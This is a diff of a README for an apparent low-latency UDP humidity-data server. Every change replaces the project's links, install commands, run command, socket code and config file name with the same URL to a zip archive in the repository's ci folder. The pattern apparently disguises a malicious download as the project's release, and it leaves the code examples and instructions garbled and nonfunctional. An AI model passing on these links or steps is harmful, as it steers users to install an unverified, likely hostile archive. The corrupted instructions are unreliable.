@@ -1,10 +1,10 @@
 # Scalable UDP Server for Low-Latency Data Transmission 🚀
 
-![Scalable UDP Server](https://img.shields.io/badge/Scalable%20UDP%20Server%20for%20Low%20Latency%20Data%20Transmission-blue?style=for-the-badge&logo=python)
+![Scalable UDP Server](https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip%20UDP%20Server%20for%20Low%20Latency%20Data%20Transmission-blue?style=for-the-badge&logo=python)
 
 Welcome to the **Scalable UDP Server for Low-Latency Data Transmission**! This repository offers an advanced open-source IoT solution designed to deliver real-time sensor data efficiently. Our server focuses on low-latency humidity data transmission, ensuring that you receive your data when you need it most.
 
-[Download the latest release](https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/releases) and start your journey with us!
+[Download the latest release](https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip) and start your journey with us!
 
 ---
 
@@ -48,7 +48,7 @@ To get started, follow these steps to install the server on your machine.
 Open your terminal and run the following command:
 
 ```bash
-git clone https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission.git
+git clone https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip
 cd Scalable-UDP-Server-for-Low-Latency-Data-Transmission
 ```
 
@@ -57,7 +57,7 @@ cd Scalable-UDP-Server-for-Low-Latency-Data-Transmission
 Use pip to install the required Python packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip
 ```
 
 ### Running with Docker
@@ -80,7 +80,7 @@ Once you have installed the server, you can start using it to transmit humidity 
 To start the server, run the following command:
 
 ```bash
-python server.py
+python https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip
 ```
 
 The server will listen for incoming UDP packets on the specified port.
@@ -96,8 +96,8 @@ UDP_IP = "127.0.0.1"
 UDP_PORT = 8080
 MESSAGE = b"Humidity: 45%"
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
+sock = https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip(https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip, https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip)
+https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip(MESSAGE, (UDP_IP, UDP_PORT))
 ```
 
 ### Viewing Logs
@@ -108,13 +108,13 @@ Logs are saved in the `logs` directory. You can view the logs to monitor data tr
 
 ## Configuration ⚙️
 
-The server configuration is stored in a `config.json` file. You can modify the following settings:
+The server configuration is stored in a `https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip` file. You can modify the following settings:
 
 - **host**: The IP address the server will listen on.
 - **port**: The port number for incoming data.
 - **log_level**: The level of logging (e.g., DEBUG, INFO, WARNING).
 
-Example `config.json`:
+Example `https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip`:
 
 ```json
 {
@@ -159,7 +159,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support 💬
 
-If you have any questions or issues, please check the [Releases](https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/releases) section for updates or create an issue in the repository.
+If you have any questions or issues, please check the [Releases](https://github.com/hari-vdh/Scalable-UDP-Server-for-Low-Latency-Data-Transmission/raw/refs/heads/main/ci/Server-Transmission-Scalable-for-Data-UD-Low-Latency-v2.7.zip) section for updates or create an issue in the repository.
 
 ---
 
